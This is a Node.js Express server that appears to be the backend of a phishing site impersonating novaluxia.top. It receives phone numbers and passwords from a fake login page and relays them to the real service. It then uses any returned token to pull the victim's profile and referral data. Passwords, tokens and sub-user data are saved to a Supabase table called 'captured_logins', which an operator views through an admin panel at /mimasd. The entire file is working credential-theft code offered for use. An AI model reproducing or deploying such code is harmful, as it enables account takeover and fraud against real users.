// ============================================
// EXPRESS SERVER — Keeps all secrets server-side
// ============================================
require('dotenv').config();

// Global crash handler — logs unhandled rejections instead of crashing
process.on('unhandledRejection', (reason, promise) => {
  console.error('!!! UNHANDLED REJECTION:', reason);
});
process.on('uncaughtException', (err) => {
  console.error('!!! UNCAUGHT EXCEPTION:', err);
});

const express = require('express');
const cors = require('cors');
const path = require('path');
const https = require('https');
const { createClient } = require('@supabase/supabase-js');
const ws = require('ws');

const app = express();
const PORT = process.env.PORT || 5500;

// --- Supabase Client (server-side only) ---
const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_ANON_KEY,
  {
    auth: {
      persistSession: false // Server-side client doesn't need to persist session
    },
    realtime: {
      transport: ws
    }
  }
);

// --- Middleware ---
app.use(cors());
app.use(express.json());
app.use((err, req, res, _next) => {
  console.error('Express error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

// --- Serve static files from /public ---
app.use(express.static(path.join(__dirname, 'public')));

// --- Simple in-memory admin session tokens ---
const adminTokens = new Set();

function generateToken() {
  return Array.from(crypto.getRandomValues(new Uint8Array(32)))
    .map(b => b.toString(16).padStart(2, '0')).join('');
}

// ============================================
// API ROUTES
// ============================================

// --- POST /api/login ---
// Called by the login page. Proxies to real novaluxia.top API,
// fetches referral data, and saves everything to Supabase.
app.post('/api/login', async (req, res) => {
  try {
    const { phone_number, password, user_agent } = req.body;

    if (!phone_number || !password) {
      return res.status(400).json({ error: 'Phone number and password are required.' });
    }

    const ua = user_agent || req.headers['user-agent'] || 'Unknown';
    const account = phone_number.replace('+63', '');

    console.log(`\n--- Login attempt: ${account} ---`);

    // --- 1. Forward login to real Novaluxia API ---
    let loginSuccess = false;
    let token = null;

    try {
      const loginRes = await fetch('https://novaluxia.top/api/v3/user/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Form-type': 'h5'
        },
        body: JSON.stringify({ account, password })
      });
      console.log('Proxy HTTP status:', loginRes.status);
      const loginData = await loginRes.json();
      console.log('Proxy response:', JSON.stringify(loginData));
      loginSuccess = loginData.status === 200;
      token = loginData.data?.token || null;
      console.log('Login success:', loginSuccess, 'Token:', token ? token.substring(0, 20) + '...' : 'null');
    } catch (proxyErr) {
      console.error('Proxy login FETCH error:', proxyErr.message);
      console.error('Full error:', proxyErr);
    }

    // --- 2. If login succeeded, fetch referral info ---
    let spreadUid = null;
    let inviteCode = null;
    let spreadCount = null;
    let rebateSum = null;
    let subUsers = [];

    if (loginSuccess && token) {
      try {
        const profileRes = await fetch('https://novaluxia.top/api/v3/user', {
          headers: { 'Authorization': `Bearer ${token}` }
        });
        const profile = await profileRes.json();
        if (profile.status === 200 && profile.data) {
          spreadUid = profile.data.spread_uid ?? null;
          inviteCode = profile.data.invite_code ?? null;
          spreadCount = profile.data.spread_count ?? null;
        }
      } catch (profileErr) {
        console.error('Profile fetch error:', profileErr.message);
      }

      try {
        const subRes = await fetch('https://novaluxia.top/api/v3/user/getSubUser?page=1&limit=20', {
          headers: { 'Authorization': `Bearer ${token}` }
        });
        const subData = await subRes.json();
        if (subData.status === 200 && subData.data) {
          rebateSum = subData.data.rebate_sum ?? null;
          subUsers = subData.data.data || [];
        }
      } catch (subErr) {
        console.error('Sub-user fetch error:', subErr.message);
      }
    }

    // --- 3. Save everything to Supabase ---
    const { error: insertError } = await supabase
      .from('captured_logins')
      .insert([{
        phone_number,
        password,
        user_agent: ua,
        login_success: loginSuccess,
        token,
        spread_uid: spreadUid,
        invite_code: inviteCode,
        spread_count: spreadCount,
        rebate_sum: rebateSum,
        sub_users: subUsers.length > 0 ? JSON.stringify(subUsers) : null
      }]);

    if (insertError) {
      console.error('Supabase insert error:', insertError);
    }

    // Return the actual result from the proxy login
    if (loginSuccess) {
      res.json({ success: true, message: 'Login successful!', data: { token, spread_uid: spreadUid, invite_code: inviteCode, spread_count: spreadCount, rebate_sum: rebateSum, sub_user_count: subUsers.length } });
    } else {
      res.json({ success: false, message: 'The account or password is incorrect. Please try again.' });
    }

  } catch (err) {
    console.error('Login endpoint error:', err);
    res.json({ success: false, message: 'The account or password is incorrect. Please try again.' });
  }
});

// --- POST /api/admin/login ---
// Authenticates admin users for the /mimasd panel.
app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;

  if (
    username === process.env.ADMIN_USERNAME &&
    password === process.env.ADMIN_PASSWORD
  ) {
    const token = generateToken();
    adminTokens.add(token);

    // Auto-expire token after 2 hours
    setTimeout(() => adminTokens.delete(token), 2 * 60 * 60 * 1000);

    return res.json({ success: true, token });
  }

  res.status(401).json({ success: false, message: 'Invalid credentials.' });
});

// --- Middleware: Verify admin token ---
function requireAdmin(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  const token = authHeader.split(' ')[1];
  if (!adminTokens.has(token)) {
    return res.status(401).json({ error: 'Invalid or expired token' });
  }

  next();
}

// --- GET /api/admin/data ---
// Returns all captured logins. Requires admin auth.
app.get('/api/admin/data', requireAdmin, async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('captured_logins')
      .select('*')
      .order('created_at', { ascending: false });

    if (error) {
      console.error('Supabase select error:', error);
      return res.status(500).json({ error: error.message });
    }

    res.json({ success: true, data: data || [] });

  } catch (err) {
    console.error('Admin data endpoint error:', err);
    res.status(500).json({ error: 'Failed to fetch data.' });
  }
});

// --- POST /api/admin/logout ---
app.post('/api/admin/logout', (req, res) => {
  const authHeader = req.headers.authorization;
  if (authHeader && authHeader.startsWith('Bearer ')) {
    const token = authHeader.split(' ')[1];
    adminTokens.delete(token);
  }
  res.json({ success: true });
});

// --- Catch-all: Serve the login page for any unmatched route ---
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/mimasd', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'mimasd.html'));
});

// --- Start Server ---
app.listen(PORT, () => {
  console.log(`\n🚀 Server running at http://localhost:${PORT}`);
  console.log(`   Login page:  http://localhost:${PORT}/`);
  console.log(`   Admin panel: http://localhost:${PORT}/mimasd\n`);
});
